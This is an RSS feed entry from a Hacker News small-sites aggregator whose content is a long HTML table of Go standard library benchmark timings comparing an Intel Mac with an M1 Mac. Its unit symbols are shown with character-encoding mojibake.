<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 22 Nov 2020 12:28:49 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 22 Nov 2020 12:28:49 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Go standard library benchmarks â€“ Intel vs. M1]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25158243">thread link</a>) | @jeremylevy
<br/>
November 19, 2020 | https://roland.zone/m1-go-benchmarks/ | <a href="https://web.archive.org/web/*/https://roland.zone/m1-go-benchmarks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<tr><th></th><th colspan="2">time/op</th><th>delta
</th></tr><tr><th colspan="4">pkg:archive/tar goos:darwin goarch:arm64</th></tr><tr><td>/Writer/USTAR</td><td>20.2Ã‚Âµs Ã‚Â±26%</td><td>2.4Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™87.95%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>/Writer/GNU</td><td>4.56Ã‚Âµs Ã‚Â± 2%</td><td>2.84Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™37.83%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>/Writer/PAX</td><td>7.95Ã‚Âµs Ã‚Â± 2%</td><td>4.96Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™37.59%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>/Reader/USTAR</td><td>3.60Ã‚Âµs Ã‚Â± 2%</td><td>2.20Ã‚Âµs Ã‚Â± 2%</td><td>Ã¢Ë†â€™38.89%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>/Reader/GNU</td><td>2.29Ã‚Âµs Ã‚Â± 2%</td><td>1.40Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™38.74%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>/Reader/PAX</td><td>7.58Ã‚Âµs Ã‚Â± 3%</td><td>4.65Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™38.57%</td><td>(p=0.008 n=5+5)
</td></tr><tr><th colspan="4">pkg:archive/zip goos:darwin goarch:arm64</th></tr><tr><td>CompressedZipGarbage</td><td>4.84ms Ã‚Â± 8%</td><td>1.57ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™67.51%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>Zip64Test</td><td>12.1ms Ã‚Â± 3%</td><td>11.8ms Ã‚Â± 1%</td><td>~</td><td>(p=0.095 n=5+5)
</td></tr><tr><td>Zip64TestSizes/4096</td><td>7.44Ã‚Âµs Ã‚Â±12%</td><td>3.79Ã‚Âµs Ã‚Â± 3%</td><td>Ã¢Ë†â€™49.01%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Zip64TestSizes/1048576</td><td>102Ã‚Âµs Ã‚Â± 5%</td><td>40Ã‚Âµs Ã‚Â± 2%</td><td>Ã¢Ë†â€™60.29%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Zip64TestSizes/67108864</td><td>6.02ms Ã‚Â± 3%</td><td>2.26ms Ã‚Â± 1%</td><td>Ã¢Ë†â€™62.37%</td><td>(p=0.008 n=5+5)
</td></tr><tr><th colspan="4">pkg:bufio goos:darwin goarch:arm64</th></tr><tr><td>ReaderCopyOptimal</td><td>84.5ns Ã‚Â± 4%</td><td>54.9ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™35.01%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ReaderCopyUnoptimal</td><td>140ns Ã‚Â± 4%</td><td>91ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™34.72%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ReaderCopyNoWriteTo</td><td>3.98Ã‚Âµs Ã‚Â± 4%</td><td>1.55Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™60.98%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ReaderWriteToOptimal</td><td>313ns Ã‚Â± 5%</td><td>321ns Ã‚Â± 1%</td><td>~</td><td>(p=0.310 n=5+5)
</td></tr><tr><td>ReaderReadString</td><td>107ns Ã‚Â± 3%</td><td>74ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™30.38%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterCopyOptimal</td><td>91.3ns Ã‚Â± 2%</td><td>58.1ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™36.39%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterCopyUnoptimal</td><td>116ns Ã‚Â± 2%</td><td>70ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™39.42%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterCopyNoReadFrom</td><td>3.85Ã‚Âµs Ã‚Â± 2%</td><td>1.53Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™60.21%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ReaderEmpty</td><td>792ns Ã‚Â± 4%</td><td>354ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™55.27%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterEmpty</td><td>694ns Ã‚Â± 5%</td><td>342ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™50.76%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterFlush</td><td>13.7ns Ã‚Â± 2%</td><td>8.9ns Ã‚Â± 4%</td><td>Ã¢Ë†â€™34.87%</td><td>(p=0.008 n=5+5)
</td></tr><tr><th colspan="4">pkg:bytes goos:darwin goarch:arm64</th></tr><tr><td>ReadString</td><td>5.76Ã‚Âµs Ã‚Â± 5%</td><td>2.16Ã‚Âµs Ã‚Â± 2%</td><td>Ã¢Ë†â€™62.56%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriteByte</td><td>13.2Ã‚Âµs Ã‚Â±12%</td><td>9.0Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™31.51%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriteRune</td><td>32.4Ã‚Âµs Ã‚Â± 2%</td><td>18.2Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™43.98%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BufferNotEmptyWriteRead</td><td>222Ã‚Âµs Ã‚Â± 1%</td><td>184Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™17.11%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BufferFullSmallReads</td><td>50.8Ã‚Âµs Ã‚Â± 1%</td><td>36.1Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™28.89%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexByte/10</td><td>5.17ns Ã‚Â± 2%</td><td>4.16ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™19.48%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexByte/32</td><td>6.46ns Ã‚Â± 2%</td><td>3.94ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™38.91%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>IndexByte/4K</td><td>84.3ns Ã‚Â± 2%</td><td>72.9ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™13.52%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexByte/4M</td><td>176Ã‚Âµs Ã‚Â±15%</td><td>64Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™63.48%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexByte/64M</td><td>4.42ms Ã‚Â± 2%</td><td>1.08ms Ã‚Â± 2%</td><td>Ã¢Ë†â€™75.47%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexBytePortable/10</td><td>6.38ns Ã‚Â± 1%</td><td>5.66ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™11.29%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexBytePortable/32</td><td>27.7ns Ã‚Â± 1%</td><td>12.5ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™54.77%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>IndexBytePortable/4K</td><td>1.55Ã‚Âµs Ã‚Â± 2%</td><td>1.29Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™16.30%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexBytePortable/4M</td><td>1.60ms Ã‚Â± 1%</td><td>1.31ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™17.84%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexBytePortable/64M</td><td>26.3ms Ã‚Â± 1%</td><td>21.1ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™19.79%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRune/10</td><td>17.1ns Ã‚Â± 2%</td><td>9.7ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™43.04%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRune/32</td><td>17.2ns Ã‚Â± 0%</td><td>13.6ns Ã‚Â± 2%</td><td>Ã¢Ë†â€™21.37%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>IndexRune/4K</td><td>116ns Ã‚Â± 2%</td><td>85ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™26.81%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRune/4M</td><td>170Ã‚Âµs Ã‚Â± 3%</td><td>64Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™62.34%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRune/64M</td><td>4.74ms Ã‚Â± 2%</td><td>1.08ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™77.31%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/10</td><td>5.39ns Ã‚Â± 3%</td><td>4.05ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™24.86%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/32</td><td>6.88ns Ã‚Â± 2%</td><td>3.92ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™43.10%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/4K</td><td>84.2ns Ã‚Â± 2%</td><td>73.0ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™13.35%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/4M</td><td>157Ã‚Âµs Ã‚Â± 4%</td><td>64Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™59.18%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/64M</td><td>4.37ms Ã‚Â± 1%</td><td>1.08ms Ã‚Â± 1%</td><td>Ã¢Ë†â€™75.37%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/0</td><td>3.01ns Ã‚Â± 0%</td><td>2.05ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™32.05%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>Equal/1</td><td>6.56ns Ã‚Â± 0%</td><td>3.43ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™47.73%</td><td>(p=0.000 n=4+5)
</td></tr><tr><td>Equal/6</td><td>6.57ns Ã‚Â± 0%</td><td>3.81ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™42.01%</td><td>(p=0.000 n=4+5)
</td></tr><tr><td>Equal/9</td><td>6.38ns Ã‚Â± 1%</td><td>3.75ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™41.24%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/15</td><td>6.36ns Ã‚Â± 1%</td><td>3.73ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™41.38%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/16</td><td>6.38ns Ã‚Â± 2%</td><td>3.82ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™40.10%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/20</td><td>7.38ns Ã‚Â± 3%</td><td>4.28ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™42.02%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/32</td><td>8.25ns Ã‚Â± 4%</td><td>4.12ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™50.10%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/4K</td><td>106ns Ã‚Â± 1%</td><td>84ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™20.83%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/4M</td><td>267Ã‚Âµs Ã‚Â± 1%</td><td>111Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™58.45%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/64M</td><td>6.98ms Ã‚Â± 2%</td><td>2.20ms Ã‚Â± 1%</td><td>Ã¢Ë†â€™68.54%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/10</td><td>12.4ns Ã‚Â± 2%</td><td>5.3ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™57.46%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/32</td><td>12.6ns Ã‚Â± 2%</td><td>29.2ns Ã‚Â± 1%</td><td>+131.13%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/4K</td><td>4.91Ã‚Âµs Ã‚Â± 1%</td><td>1.95Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™60.40%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/4M</td><td>5.04ms Ã‚Â± 2%</td><td>1.99ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™60.58%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/64M</td><td>82.9ms Ã‚Â± 6%</td><td>31.9ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™61.53%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/10</td><td>10.8ns Ã‚Â± 4%</td><td>5.1ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™53.05%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/32</td><td>12.3ns Ã‚Â± 7%</td><td>9.2ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™25.69%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/4K</td><td>107ns Ã‚Â± 2%</td><td>77ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™27.90%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/4M</td><td>176Ã‚Âµs Ã‚Â± 5%</td><td>64Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™63.77%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/64M</td><td>4.62ms Ã‚Â± 7%</td><td>1.07ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™76.76%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Count/10</td><td>18.4ns Ã‚Â± 1%</td><td>9.9ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™45.98%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>Count/32</td><td>19.5ns Ã‚Â± 2%</td><td>33.4ns Ã‚Â± 0%</td><td>+71.29%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>Count/4K</td><td>4.92Ã‚Âµs Ã‚Â± 1%</td><td>1.96Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™60.24%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>Count/4M</td><td>5.09ms Ã‚Â± 5%</td><td>1.99ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™60.94%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Count/64M</td><td>81.5ms Ã‚Â± 2%</td><td>31.9ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™60.89%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountEasy/10</td><td>17.0ns Ã‚Â± 2%</td><td>9.5ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™43.98%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountEasy/32</td><td>19.1ns Ã‚Â± 1%</td><td>15.2ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™20.43%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>CountEasy/4K</td><td>113ns Ã‚Â± 2%</td><td>83ns Ã‚Â± 2%</td><td>Ã¢Ë†â€™26.89%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountEasy/4M</td><td>175Ã‚Âµs Ã‚Â± 4%</td><td>64Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™63.67%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountEasy/64M</td><td>4.72ms Ã‚Â± 2%</td><td>1.07ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™77.23%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountSingle/10</td><td>6.67ns Ã‚Â± 3%</td><td>6.96ns Ã‚Â± 1%</td><td>+4.41%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountSingle/32</td><td>7.36ns Ã‚Â± 1%</td><td>4.46ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™39.43%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>CountSingle/4K</td><td>100ns Ã‚Â±15%</td><td>82ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™17.62%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountSingle/4M</td><td>171Ã‚Âµs Ã‚Â±21%</td><td>83Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™51.70%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountSingle/64M</td><td>4.50ms Ã‚Â± 0%</td><td>1.38ms Ã‚Â± 1%</td><td>Ã¢Ë†â€™69.26%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/#00</td><td>8.87ns Ã‚Â± 2%</td><td>4.66ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™47.40%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/ONLYUPPER</td><td>43.7ns Ã‚Â± 3%</td><td>30.4ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™30.55%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/abc</td><td>25.9ns Ã‚Â± 2%</td><td>16.6ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™36.19%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/AbC123</td><td>32.1ns Ã‚Â± 3%</td><td>19.9ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™38.10%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/azAZ09_</td><td>31.8ns Ã‚Â± 1%</td><td>18.6ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™41.54%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/longStrinGwitHmixofsmaLLandcAps</td><td>72.5ns Ã‚Â± 3%</td><td>45.7ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™36.96%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/longÃ‰ï¿½stringÃ‰ï¿½withÃ‰ï¿½nonasciiÃ¢Â±Â¯chars</td><td>425ns Ã‚Â± 2%</td><td>249ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™41.31%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/Ã‰ï¿½Ã‰ï¿½Ã‰ï¿½Ã‰ï¿½Ã‰ï¿½</td><td>229ns Ã‚Â± 2%</td><td>158ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™31.24%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/a\u0080\U0010ffff</td><td>108ns Ã‚Â± 3%</td><td>73ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™32.04%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/#00</td><td>9.17ns Ã‚Â± 1%</td><td>4.66ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™49.16%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/abc</td><td>34.3ns Ã‚Â± 1%</td><td>20.4ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™40.56%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/AbC123</td><td>32.8ns Ã‚Â± 2%</td><td>17.9ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™45.42%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/azAZ09_</td><td>35.7ns Ã‚Â± 3%</td><td>20.5ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™42.66%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/longStrinGwitHmixofsmaLLandcAps</td><td>75.6ns Ã‚Â± 1%</td><td>47.5ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™37.23%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/LONGÃ¢Â±Â¯STRINGÃ¢Â±Â¯WITHÃ¢Â±Â¯NONASCIIÃ¢Â±Â¯CHARS</td><td>356ns Ã‚Â± 2%</td><td>220ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™38.08%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/Ã¢Â±Â­Ã¢Â±Â­Ã¢Â±Â­Ã¢Â±Â­Ã¢Â±Â­</td><td>191ns Ã‚Â± 2%</td><td>134ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™29.76%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/A\u0080\U0010ffff</td><td>108ns Ã‚Â± 2%</td><td>72ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™32.99%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/16</td><td>95.9ns Ã‚Â± 3%</td><td>44.3ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™53.76%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/256</td><td>660ns Ã‚Â± 3%</td><td>357ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™45.96%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/4096</td><td>9.66Ã‚Âµs Ã‚Â± 3%</td><td>4.94Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™48.82%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/65536</td><td>200Ã‚Âµs Ã‚Â± 1%</td><td>111Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™44.32%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/1048576</td><td>3.16ms Ã‚Â± 1%</td><td>1.88ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™40.42%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/16</td><td>185ns Ã‚Â± 3%</td><td>109ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™40.97%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/256</td><td>1.81Ã‚Âµs Ã‚Â± 2%</td><td>1.06Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™41.37%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/4096</td><td>33.6Ã‚Âµs Ã‚Â± 5%</td><td>19.3Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™42.50%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/65536</td><td>569Ã‚Âµs Ã‚Â± 2%</td><td>343Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™39.63%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/1048576</td><td>9.32ms Ã‚Â± 5%</td><td>5.54ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™40.57%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/ASCII/16</td><td>154ns Ã‚Â± 5%</td><td>87ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™43.61%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/ASCII/256</td><td>1.58Ã‚Âµs Ã‚Â± 9%</td><td>0.91Ã‚Âµs Ã‚Â± 1%</td><td>Ã¢Ë†â€™42.47%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/ASCII/4096</td><td>26.0Ã‚Âµs Ã‚Â± 2%</td><td>15.6Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™39.96%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/ASCII/65536</td><td>411Ã‚Âµs Ã‚Â± 0%</td><td>249Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™39.36%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>FieldsFunc/ASCII/1048576</td><td>6.64ms Ã‚Â± 1%</td><td>4.00ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™39.73%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/Mixed/16</td><td>168ns Ã‚Â± 0%</td><td>101ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™39.72%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>FieldsFunc/Mixed/256</td><td>1.59Ã‚Âµs Ã‚Â± 1%</td><td>0.93Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™41.16%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/Mixed/4096</td><td>29.9Ã‚Âµs Ã‚Â± 3%</td><td>17.5Ã‚Âµs Ã‚Â± 2%</td><td>Ã¢Ë†â€™41.65%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/Mixed/65536</td><td>509Ã‚Âµs Ã‚Â± 2%</td><td>311Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™38.81%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/Mixed/1048576</td><td>8.22ms Ã‚Â± 1%</td><td>5.05ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™38.53%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>TrimSpace/NoTrim</td><td>4.66ns Ã‚Â± 1%</td><td>2.75ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™40.85%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>TrimSpace/ASCII</td><td>7.18ns Ã‚Â± 1%</td><td>4.89ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™31.93%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>TrimSpace/SomeNonASCII</td><td>85.5ns Ã‚Â± 2%</td><td>59.6ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™30.23%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>TrimSpace/JustNonASCII</td><td>158ns Ã‚Â± 3%</td><td>107ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™32.38%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToValidUTF8/Valid</td><td>29.9ns Ã‚Â± 2%</td><td>18.0ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™39.99%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToValidUTF8/InvalidASCII</td><td>36.3ns Ã‚Â± 1%</td><td>24.5ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™32.62%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToValidUTF8/InvalidNonASCII</td><td>87.8ns Ã‚Â± 2%</td><td>53.9ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™38.64%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexHard1</td><td>114Ã‚Âµs Ã‚Â± 2%</td><td>330Ã‚Âµs Ã‚Â± 0%</td><td>+190.43%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexHard2</td><td>159Ã‚Âµs Ã‚Â± 2%</td><td>330Ã‚Âµs Ã‚Â± 0%</td><td>+107.98%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexHard3</td><td>631Ã‚Âµs Ã‚Â± 1%</td><td>356Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™43.61%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexHard4</td><td>633Ã‚Âµs Ã‚Â± 1%</td><td>1313Ã‚Âµs Ã‚Â± 0%</td><td>+107.26%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>LastIndexHard1</td><td>1.56ms Ã‚Â± 1%</td><td>1.31ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™15.66%</td><td>(p=0.008 n=5+5)
